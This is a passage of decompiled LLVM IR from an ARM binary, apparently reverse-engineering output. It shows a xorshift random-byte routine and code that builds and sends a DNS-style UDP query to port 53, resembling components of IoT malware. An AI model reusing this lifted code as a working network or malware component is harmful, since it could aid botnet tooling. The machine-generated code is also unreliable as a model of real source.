  %v2_eab8 = call i32 @function_11878(i32 %v0_eab4, i32 %v2_eaac)
  %v2_eac0 = add i32 %v2_eab8, %v28_ea2c
  %v1_eac4 = add i32 %v2_eac0, -32
  %v2_eac4 = inttoptr i32 %v1_eac4 to i8*
  %v3_eac4 = load i8, i8* %v2_eac4, align 1
  %v2_eac8 = load i32, i32* @r5, align 4
  %v3_eac8 = load i32, i32* %fp.global-to-local, align 4
  %v4_eac8 = add i32 %v3_eac8, %v2_eac8
  %v5_eac8 = inttoptr i32 %v4_eac8 to i8*
  store i8 %v3_eac4, i8* %v5_eac8, align 1
  %v0_eacc = load i32, i32* @r5, align 4
  %v1_eacc = add i32 %v0_eacc, 1
  store i32 %v1_eacc, i32* @r5, align 4
  %v1_ead0 = load i32, i32* %sb.global-to-local, align 4
  %v9_ead0 = icmp eq i32 %v1_eacc, %v1_ead0
  br i1 %v9_ead0, label %dec_label_pc_ead8, label %dec_label_pc_ea78.dec_label_pc_ea78_crit_edge

dec_label_pc_ea78.dec_label_pc_ea78_crit_edge:    ; preds = %dec_label_pc_ea78
  %v1_ea9c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_ea78

dec_label_pc_ead8:                                ; preds = %dec_label_pc_ea78, %dec_label_pc_ea2c
  %v1_eadc = call i32 @function_10b68(i32 28)
  %v2_eae4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_eae4, i32* @r4, align 4
  store i32 %v6_ea2c, i32* @r5, align 4
  store i32 %v9_ea2c, i32* @r6, align 4
  store i32 %v12_ea2c, i32* @r7, align 4
  ret i32 %v1_eadc

; uselistorder directives
  uselistorder i32 %v2_ea7c, { 1, 0 }
  uselistorder i32 %v2_ea78, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
}

define i32 @function_eaf8(i8* %arg1) local_unnamed_addr {
dec_label_pc_eaf8:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_eaf8 = load i32, i32* @r4, align 4
  store i32 %v3_eaf8, i32* %stack_var_-36, align 4
  %v9_eaf8 = load i32, i32* @r6, align 4
  %v12_eaf8 = load i32, i32* @r7, align 4
  %v15_eaf8 = load i32, i32* @r8, align 4
  %v18_eaf8 = load i32, i32* @sb, align 4
  %v21_eaf8 = load i32, i32* @sl, align 4
  %v24_eaf8 = load i32, i32* @fp, align 4
  %v0_eafc = load i32, i32* @r1, align 4
  store i32 %v0_eafc, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_eafc, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_eaf8
  store i32 %v3_eaf8, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_eaf8
  store i32 ptrtoint (i32* @global_var_1ca9c.111 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca98.115 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca94.113 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ca90.109 to i32), i32* %r8.global-to-local, align 4
  %v2_eb18 = load i32, i32* @global_var_1ca9c.111, align 4
  store i32 %v2_eb18, i32* @lr, align 4
  %v2_eb1c = load i32, i32* @global_var_1ca98.115, align 4
  store i32 %v2_eb1c, i32* %r7.global-to-local, align 4
  %v2_eb20 = load i32, i32* @global_var_1ca94.113, align 4
  store i32 %v2_eb20, i32* %r6.global-to-local, align 4
  %v2_eb24 = load i32, i32* @global_var_1ca90.109, align 4
  br label %dec_label_pc_eb50

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eb7c
  %v3_eb84 = sdiv i32 %v5_eb68, 256
  %v1_eb2c = trunc i32 %v3_eb84 to i8
  %v3_eb2c = add i32 %v9_eb70, 1
  %v4_eb2c = inttoptr i32 %v3_eb2c to i8*
  store i8 %v1_eb2c, i8* %v4_eb2c, align 1
  %v0_eb30 = load i32, i32* %r3.global-to-local, align 4
  %v1_eb30 = trunc i32 %v0_eb30 to i8
  %v2_eb30 = load i32, i32* %r5.global-to-local, align 4
  %v3_eb30 = inttoptr i32 %v2_eb30 to i8*
  store i8 %v1_eb30, i8* %v3_eb30, align 1
  %v0_eb34 = load i32, i32* %r5.global-to-local, align 4
  %v1_eb34 = add i32 %v0_eb34, 2
  store i32 %v1_eb34, i32* %r5.global-to-local, align 4
  %v0_eb38.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb38

dec_label_pc_eb38:                                ; preds = %.thread, %dec_label_pc_eb2c
  %v0_eb38 = phi i32 [ %v9_eb74, %.thread ], [ %v0_eb38.pre, %dec_label_pc_eb2c ]
  %v2_eb2c7 = phi i32 [ %v12_eb70, %.thread ], [ %v1_eb34, %dec_label_pc_eb2c ]
  %tmp22 = icmp slt i32 %v0_eb38, 1
  br i1 %tmp22, label %dec_label_pc_ebb8, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_eb38
  %v0_eb3c = load i32, i32* %r6.global-to-local, align 4
  %v0_eb44 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_eb44, i32* %r6.global-to-local, align 4
  %v0_eb48 = load i32, i32* @lr, align 4
  store i32 %v0_eb48, i32* %r7.global-to-local, align 4
  %v0_eb4c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_eb4c, i32* @lr, align 4
  br label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %bb21, %dec_label_pc_eb44
  %v0_eba0 = phi i32 [ %v2_eb20, %bb21 ], [ %v0_eb44, %dec_label_pc_eb44 ]
  %v9_eb70 = phi i32 [ %tmp, %bb21 ], [ %v2_eb2c7, %dec_label_pc_eb44 ]
  %v0_eb88 = phi i32 [ %v0_eafc, %bb21 ], [ %v0_eb38, %dec_label_pc_eb44 ]
  %v0_eb94 = phi i32 [ %v2_eb18, %bb21 ], [ %v0_eb4c, %dec_label_pc_eb44 ]
  %v0_eb90 = phi i32 [ %v2_eb24, %bb21 ], [ %v0_eb3c, %dec_label_pc_eb44 ]
  %v4_eb50 = mul i32 %v0_eb90, 2048
  %v5_eb50 = xor i32 %v4_eb50, %v0_eb90
  %v4_eb54 = udiv i32 %v0_eb94, 524288
  %v5_eb54 = xor i32 %v4_eb54, %v0_eb94
  %v2_eb58 = xor i32 %v5_eb54, %v5_eb50
  %v4_eb68 = udiv i32 %v5_eb50, 256
  %v5_eb68 = xor i32 %v4_eb68, %v2_eb58
  store i32 %v5_eb68, i32* %r3.global-to-local, align 4
  %v7_eb70 = icmp sgt i32 %v0_eb88, 3
  br i1 %v7_eb70, label %.thread, label %dec_label_pc_eb7c

.thread:                                          ; preds = %dec_label_pc_eb50
  %v10_eb70 = inttoptr i32 %v9_eb70 to i32*
  store i32 %v5_eb68, i32* %v10_eb70, align 4
  %v11_eb70 = load i32, i32* %r5.global-to-local, align 4
  %v12_eb70 = add i32 %v11_eb70, 4
  store i32 %v12_eb70, i32* %r5.global-to-local, align 4
  %v8_eb74 = load i32, i32* %r4.global-to-local, align 4
  %v9_eb74 = add i32 %v8_eb74, -4
  store i32 %v9_eb74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb38

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb50
  store i32 %v5_eb68, i32* %r3.global-to-local, align 4
  %v7_eb80 = icmp eq i32 %v0_eb88, 1
  %v1_eb88 = add i32 %v0_eb88, -2
  store i32 %v1_eb88, i32* %r4.global-to-local, align 4
  br i1 %v7_eb80, label %dec_label_pc_eb90, label %dec_label_pc_eb2c

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb7c
  store i32 %v5_eb68, i32* %r3.global-to-local, align 4
  %v1_eba0 = load i32, i32* %r8.global-to-local, align 4
  %v2_eba0 = inttoptr i32 %v1_eba0 to i32*
  store i32 %v0_eba0, i32* %v2_eba0, align 4
  %v0_eba4 = load i32, i32* %r7.global-to-local, align 4
  %v1_eba4 = load i32, i32* %sl.global-to-local, align 4
  %v2_eba4 = inttoptr i32 %v1_eba4 to i32*
  store i32 %v0_eba4, i32* %v2_eba4, align 4
  %v0_eba8 = load i32, i32* @lr, align 4
  %v1_eba8 = load i32, i32* %sb.global-to-local, align 4
  %v2_eba8 = inttoptr i32 %v1_eba8 to i32*
  store i32 %v0_eba8, i32* %v2_eba8, align 4
  %v0_ebac = load i32, i32* %r3.global-to-local, align 4
  %v1_ebac = load i32, i32* %fp.global-to-local, align 4
  %v2_ebac = inttoptr i32 %v1_ebac to i32*
  store i32 %v0_ebac, i32* %v2_ebac, align 4
  %v0_ebb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ebb0 = trunc i32 %v0_ebb0 to i8
  %v2_ebb0 = load i32, i32* %r5.global-to-local, align 4
  %v3_ebb0 = inttoptr i32 %v2_ebb0 to i8*
  store i8 %v1_ebb0, i8* %v3_ebb0, align 1
  %v2_ebb4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ebb4, i32* @r4, align 4
  store i32 %v9_eaf8, i32* @r6, align 4
  store i32 %v12_eaf8, i32* @r7, align 4
  store i32 %v15_eaf8, i32* @r8, align 4
  store i32 %v18_eaf8, i32* @sb, align 4
  store i32 %v21_eaf8, i32* @sl, align 4
  store i32 %v24_eaf8, i32* @fp, align 4
  ret i32 %v5_eb50

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_eb38
  %v0_ebb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ebb8 = load i32, i32* %fp.global-to-local, align 4
  %v2_ebb8 = inttoptr i32 %v1_ebb8 to i32*
  store i32 %v0_ebb8, i32* %v2_ebb8, align 4
  %v0_ebbc = load i32, i32* @lr, align 4
  %v1_ebbc = load i32, i32* %sb.global-to-local, align 4
  %v2_ebbc = inttoptr i32 %v1_ebbc to i32*
  store i32 %v0_ebbc, i32* %v2_ebbc, align 4
  %v0_ebc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_ebc0 = load i32, i32* %sl.global-to-local, align 4
  %v2_ebc0 = inttoptr i32 %v1_ebc0 to i32*
  store i32 %v0_ebc0, i32* %v2_ebc0, align 4
  %v0_ebc4 = load i32, i32* %r6.global-to-local, align 4
  %v1_ebc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_ebc4 = inttoptr i32 %v1_ebc4 to i32*
  store i32 %v0_ebc4, i32* %v2_ebc4, align 4
  %v2_ebc8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ebc8, i32* @r4, align 4
  store i32 %v9_eaf8, i32* @r6, align 4
  store i32 %v12_eaf8, i32* @r7, align 4
  store i32 %v15_eaf8, i32* @r8, align 4
  store i32 %v18_eaf8, i32* @sb, align 4
  store i32 %v21_eaf8, i32* @sl, align 4
  store i32 %v24_eaf8, i32* @fp, align 4
  ret i32 %v5_eb50

; uselistorder directives
  uselistorder i32 %v9_eb74, { 1, 0 }
  uselistorder i32 %v12_eb70, { 1, 0 }
  uselistorder i32 %v5_eb68, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_eb50, { 1, 2, 0, 3 }
  uselistorder i32 %v0_eb90, { 1, 0 }
  uselistorder i32 %v0_eb94, { 1, 0 }
  uselistorder i32 %v0_eb38, { 1, 0 }
  uselistorder i32 %v24_eaf8, { 1, 0 }
  uselistorder i32 %v21_eaf8, { 1, 0 }
  uselistorder i32 %v18_eaf8, { 1, 0 }
  uselistorder i32 %v15_eaf8, { 1, 0 }
  uselistorder i32 %v12_eaf8, { 1, 0 }
  uselistorder i32 %v9_eaf8, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* @global_var_1ca90.109, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1ca90.109 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1ca94.113, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1ca98.115, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1ca9c.111, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_eb50, { 1, 0 }
}

define i32 @function_ebdc(i32 %arg1) local_unnamed_addr {
dec_label_pc_ebdc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ebdc = load i32, i32* @r4, align 4
  store i32 %v3_ebdc, i32* %stack_var_-8, align 4
  %v6_ebdc = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_ebe0 = icmp eq i32 %arg1, 0
  br i1 %v2_ebe0, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_ebdc
  store i32 %v3_ebdc, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %dec_label_pc_ebdc
  %v1_ebe8 = add i32 %arg1, 4
  %v2_ebe8 = inttoptr i32 %v1_ebe8 to i32*
  %v3_ebe8 = load i32, i32* %v2_ebe8, align 4
  %v1_ebf0 = icmp ne i32 %v3_ebe8, 0
  call void @__pseudo_cond_branch(i1 %v1_ebf0, i32 ptrtoint (i32* @global_var_12724.25 to i32))
  %v0_ebf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ebf4, i32* @r0, align 4
  %v2_ebf8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ebf8, i32* @r4, align 4
  store i32 %v6_ebdc, i32* @lr, align 4
  %v0_ebfc = call i32 @function_12724()
  ret i32 %v0_ebfc
}

define i32 @function_ec00(i8* %arg1) local_unnamed_addr {
dec_label_pc_ec00:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-4288 = alloca i8, align 1
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2227 = alloca i32, align 4
  %stack_var_-2240 = alloca i8, align 1
  %stack_var_-2228 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ec00 = load i32, i32* @r4, align 4
  store i32 %v3_ec00, i32* %stack_var_-36, align 4
  %v6_ec00 = load i32, i32* @r5, align 4
  %v9_ec00 = load i32, i32* @r6, align 4
  %v12_ec00 = load i32, i32* @r7, align 4
  %v15_ec00 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_ec18 = call i32 @function_126cc(i32 1, i32 8)
  %v0_ec20 = load i32, i32* @r4, align 4
  %v1_ec20 = inttoptr i32 %v0_ec20 to i8*
  store i32 %v0_ec20, i32* %r0.global-to-local, align 4
  %v3_ec24 = call i32 @function_111ec(i8* %v1_ec20)
  %v2_ec2c = ptrtoint i32* %stack_var_-2228 to i32
  store i32 %v2_ec2c, i32* %fp.global-to-local, align 4
  %v2_ec30 = ptrtoint i8* %stack_var_-2240 to i32
  %v1_ec34 = add i32 %v3_ec24, 1
  store i32 %v1_ec34, i32* %r0.global-to-local, align 4
  %v2_ec38 = ptrtoint i32* %stack_var_-2227 to i32
  store i32 %v2_ec38, i32* %r2.global-to-local, align 4
  store i32 %v2_ec2c, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_ec78162 = icmp eq i32 %v1_ec34, 0
  store i1 %v2_ec78162, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_ec80163 = or i32 %v2_ec38, 1
  store i32 %v1_ec80163, i32* %r1.global-to-local, align 4
  %tmp124164 = icmp slt i32 %v1_ec34, 1
  br i1 %tmp124164, label %dec_label_pc_ec88, label %dec_label_pc_ec48.lr.ph

dec_label_pc_ec48.lr.ph:                          ; preds = %dec_label_pc_ec00
  %v0_ec48.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ec48

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec48.lr.ph, %.thread12
  %v1_ec5c176.off0 = phi i8 [ 0, %dec_label_pc_ec48.lr.ph ], [ %extract.t179, %.thread12 ]
  %v0_ec48 = phi i32 [ %v0_ec48.pre, %dec_label_pc_ec48.lr.ph ], [ %v1_ec6c, %.thread12 ]
  %v2_ec8c165 = phi i32 [ %v2_ec38, %dec_label_pc_ec48.lr.ph ], [ %v0_ec74, %.thread12 ]
  %v1_ec48 = inttoptr i32 %v0_ec48 to i8*
  %v2_ec48 = load i8, i8* %v1_ec48, align 1
  %v3_ec48 = zext i8 %v2_ec48 to i32
  store i32 %v3_ec48, i32* %r3.global-to-local, align 4
  %v2_ec4c = icmp eq i8 %v2_ec48, 0
  store i1 %v2_ec4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec4c, label %.thread6, label %bb

bb:                                               ; preds = %dec_label_pc_ec48
  %v8_ec50 = icmp eq i8 %v2_ec48, 46
  store i1 %v8_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec50, label %.thread6, label %.thread

.thread:                                          ; preds = %bb
  %v4_ec54 = inttoptr i32 %v2_ec8c165 to i8*
  store i8 %v2_ec48, i8* %v4_ec54, align 1
  %v5_ec54 = load i32, i32* %r2.global-to-local, align 4
  %v6_ec54 = add i32 %v5_ec54, 1
  store i32 %v6_ec54, i32* %r2.global-to-local, align 4
  %v0_ec58.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec58.pr.pr, label %.thread..thread6_crit_edge, label %bb122

.thread..thread6_crit_edge:                       ; preds = %.thread
  %v1_ec5c.pre = load i32, i32* %lr.global-to-local, align 4
  %extract.t = trunc i32 %v1_ec5c.pre to i8
  br label %.thread6

.thread6:                                         ; preds = %.thread..thread6_crit_edge, %bb, %dec_label_pc_ec48
  %v1_ec5c.off0 = phi i8 [ %extract.t, %.thread..thread6_crit_edge ], [ %v1_ec5c176.off0, %bb ], [ %v1_ec5c176.off0, %dec_label_pc_ec48 ]
  %v3_ec5c = load i32, i32* %r5.global-to-local, align 4
  %v4_ec5c = inttoptr i32 %v3_ec5c to i8*
  store i8 %v1_ec5c.off0, i8* %v4_ec5c, align 1
  %v0_ec60.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ec60.pr, label %bb123, label %..thread12_crit_edge

bb122:                                            ; preds = %.thread
  store i32 %v6_ec54, i32* %r1.global-to-local, align 4
  %v1_ec60 = load i32, i32* %ip.global-to-local, align 4
  %v2_ec60 = urem i32 %v1_ec60, 256
  store i32 %v2_ec60, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_ec6010 = load i32, i32* %ip.global-to-local, align 4
  %v2_ec6011 = urem i32 %v1_ec6010, 256
  store i32 %v2_ec6011, i32* %lr.global-to-local, align 4
  br label %.thread12

bb123:                                            ; preds = %.thread6
  %v1_ec64.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_ec64.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb122, %..thread12_crit_edge, %bb123
  %v0_ec7c.pre = phi i32 [ %v2_ec6011, %..thread12_crit_edge ], [ %v2_ec60, %bb122 ], [ 0, %bb123 ]
  %v0_ec6c = load i32, i32* @r4, align 4
  %v1_ec6c = add i32 %v0_ec6c, 1
  store i32 %v1_ec6c, i32* @r4, align 4
  %v0_ec70 = load i32, i32* %r0.global-to-local, align 4
  %v1_ec70 = add i32 %v0_ec70, -1
  store i32 %v1_ec70, i32* %r0.global-to-local, align 4
  %v0_ec74 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ec74, i32* %r2.global-to-local, align 4
  %v2_ec78 = icmp eq i32 %v1_ec70, 0
  store i1 %v2_ec78, i1* %cpsr_z.global-to-local, align 1
  %v1_ec7c = add nuw nsw i32 %v0_ec7c.pre, 1
  store i32 %v1_ec7c, i32* %ip.global-to-local, align 4
  %v1_ec80 = add i32 %v0_ec74, 1
  store i32 %v1_ec80, i32* %r1.global-to-local, align 4
  %tmp124 = icmp slt i32 %v1_ec70, 1
  %extract.t179 = trunc i32 %v0_ec7c.pre to i8
  br i1 %tmp124, label %dec_label_pc_ec88, label %dec_label_pc_ec48

dec_label_pc_ec88:                                ; preds = %.thread12, %dec_label_pc_ec00
  %v2_ec8c.lcssa = phi i32 [ %v2_ec38, %dec_label_pc_ec00 ], [ %v0_ec74, %.thread12 ]
  %v3_ec18 = inttoptr i32 %v2_ec18 to i8*
  store i32 0, i32* @r4, align 4
  %v3_ec8c = inttoptr i32 %v2_ec8c.lcssa to i8*
  store i8 0, i8* %v3_ec8c, align 1
  store i32 %v2_ec2c, i32* %r0.global-to-local, align 4
  %v1_ec94 = bitcast i32* %stack_var_-2228 to i8*
  %v2_ec94 = call i32 @function_111ec(i8* %v1_ec94)
  %v2_ec98 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_ec98, i32* %r1.global-to-local, align 4
  %v0_ec9c = load i32, i32* %fp.global-to-local, align 4
  %v2_ec9c = add i32 %v0_ec9c, %v2_ec94
  store i32 %v2_ec9c, i32* @r5, align 4
  %v0_eca0 = load i32, i32* @r4, align 4
  store i32 %v0_eca0, i32* %stack_var_-64, align 4
  store i32 %v2_ec2c, i32* %r0.global-to-local, align 4
  %v2_ecb4 = call i32 @function_111ec(i8* %v1_ec94)
  %v1_ecb8 = add i32 %v2_ecb4, 17
  store i32 %v1_ecb8, i32* %r0.global-to-local, align 4
  %v0_ecc0 = call i32 @function_e978()
  store i32 %v0_ecc0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r1.global-to-local, align 4
  %v2_eccc = call i32 @function_11878(i32 %v0_ecc0, i32 65535)
  store i32 16, i32* @r1, align 4
  %v6_ecd8 = urem i32 %v2_eccc, 65536
  store i32 %v6_ecd8, i32* %r3.global-to-local, align 4
  %v2_ece0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ece0, i32* @r0, align 4
  %v0_ece8 = call i32 @function_1128c()
  %sext = mul i32 %v2_eccc, 16777216
  %v4_ecec = sdiv i32 %sext, 16777216
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %v2_ec98, i32* %r3.global-to-local, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v4_ecec, i32* %lr.global-to-local, align 4
  %v0_ed34 = load i32, i32* @r5, align 4
  %v2_ed34 = add i32 %v0_ed34, 1
  store i32 %v2_ed34, i32* %ip.global-to-local, align 4
  %v2_ed38 = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_ed38, i32* %r1.global-to-local, align 4
  %v5_ed3c = trunc i32 %v4_ecec to i8
  store i8 %v5_ed3c, i8* %stack_var_-2240, align 1
  %v0_ed54 = load i32, i32* @r4, align 4
  %v1_ed54 = trunc i32 %v0_ed54 to i8
  %v4_ed54 = inttoptr i32 %v2_ed34 to i8*
  store i8 %v1_ed54, i8* %v4_ed54, align 1
  %v0_ed58 = load i32, i32* @r4, align 4
  %v1_ed58 = trunc i32 %v0_ed58 to i8
  %v2_ed58 = load i32, i32* %ip.global-to-local, align 4
  %v3_ed58 = add i32 %v2_ed58, 2
  %v4_ed58 = inttoptr i32 %v3_ed58 to i8*
  store i8 %v1_ed58, i8* %v4_ed58, align 1
  %v0_ed5c = load i32, i32* %r0.global-to-local, align 4
  %v1_ed5c = trunc i32 %v0_ed5c to i8
  %v2_ed5c = load i32, i32* %ip.global-to-local, align 4
  %v3_ed5c = add i32 %v2_ed5c, 3
  %v4_ed5c = inttoptr i32 %v3_ed5c to i8*
  store i8 %v1_ed5c, i8* %v4_ed5c, align 1
  %v0_ed60 = load i32, i32* %r0.global-to-local, align 4
  %v1_ed60 = trunc i32 %v0_ed60 to i8
  %v2_ed60 = load i32, i32* %ip.global-to-local, align 4
  %v3_ed60 = add i32 %v2_ed60, 1
  %v4_ed60 = inttoptr i32 %v3_ed60 to i8*
  store i8 %v1_ed60, i8* %v4_ed60, align 1
  %v0_ed68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed68, i32* %sl.global-to-local, align 4
  %v2_ed70 = ptrtoint i32* %stack_var_-192 to i32
  store i32 %v2_ed70, i32* @r6, align 4
  %v3_eda8 = bitcast i32* %stack_var_-64 to %sockaddr*
  %v4_edc4 = bitcast i8* %stack_var_-2240 to i32*
  %v2_ee14 = ptrtoint i32* %stack_var_-36 to i32
  %v2_ee40 = ptrtoint i32* %stack_var_-48 to i32
  %v6_ee94 = bitcast i8* %stack_var_-4288 to i32*
  %v1_ef10 = add i32 %v2_ed38, 12
  %v1_ef18 = inttoptr i32 %v1_ef10 to i8*
  %v1_ef2c = add i32 %v2_ed38, 1
  %v2_ef2c = inttoptr i32 %v1_ef2c to i8*
  %v1_ef48 = add i32 %v2_ed38, 6
  %v2_ef48 = inttoptr i32 %v1_ef48 to i8*
  %v1_ef4c = add i32 %v2_ed38, 7
  %v2_ef4c = inttoptr i32 %v1_ef4c to i8*
  br label %dec_label_pc_ed74

dec_label_pc_ed74:                                ; preds = %dec_label_pc_eec0, %dec_label_pc_ec88
  %v1_ed78 = phi i32 [ %v0_ed74.pre, %dec_label_pc_eec0 ], [ -1, %dec_label_pc_ec88 ]
  %v7_ed74 = icmp eq i32 %v1_ed78, -1
  store i1 %v7_ed74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed74, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_ed74
  store i32 %v1_ed78, i32* %r0.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %dec_label_pc_ed74, %bb125
  store i32 60800, i32* @lr, align 4
  %v1_ed7c = xor i1 %v7_ed74, true
  call void @__pseudo_cond_branch(i1 %v1_ed7c, i32 ptrtoint (i32* @global_var_11af0.104 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ed8c = call i32 @function_123e0(i32 2, i32 2, i32 0)
  store i32 %v3_ed8c, i32* %r0.global-to-local, align 4
  %v7_ed90 = icmp eq i32 %v3_ed8c, -1
  store i1 %v7_ed90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ed8c, i32* @r8, align 4
  br i1 %v7_ed90, label %dec_label_pc_ef00, label %dec_label_pc_ed9c

dec_label_pc_ed9c:                                ; preds = %bb126
  store i32 %v2_ece0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_eda8 = call i32 @function_1223c(i32 %v3_ed8c, %sockaddr* %v3_eda8, i32 16)
  store i32 %v4_eda8, i32* %r0.global-to-local, align 4
  %v7_edac = icmp eq i32 %v4_eda8, -1
  store i1 %v7_edac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edac, label %dec_label_pc_eec8, label %dec_label_pc_edb4

dec_label_pc_edb4:                                ; preds = %dec_label_pc_ed9c
  %v0_edb4 = load i32, i32* @r8, align 4
  store i32 %v0_edb4, i32* %r0.global-to-local, align 4
  store i32 %v2_ec30, i32* %r1.global-to-local, align 4
  store i32 %v1_ecb8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_edc4 = call i32 @function_12350(i32 %v0_edb4, i32* %v4_edc4, i32 %v1_ecb8, i32 16384)
  store i32 %v5_edc4, i32* %r0.global-to-local, align 4
  %v7_edc8 = icmp eq i32 %v5_edc4, -1
  store i1 %v7_edc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edc8, label %dec_label_pc_eec8, label %dec_label_pc_edd0

dec_label_pc_edd0:                                ; preds = %dec_label_pc_edb4
  %v0_edd0 = load i32, i32* @r8, align 4
  store i32 %v0_edd0, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_eddc = call i32 @function_11a2c(i32 3, i32 %v0_edd0)
  store i32 0, i32* @r4, align 4
  %v1_ede4 = or i32 %v2_eddc, 2048
  store i32 %v1_ede4, i32* @r2, align 4
  %v0_ede8 = load i32, i32* @r8, align 4
  store i32 %v0_ede8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_edf0 = call i32 @function_11a2c(i32 4, i32 %v0_ede8)
  store i32 %v2_edf0, i32* %r0.global-to-local, align 4
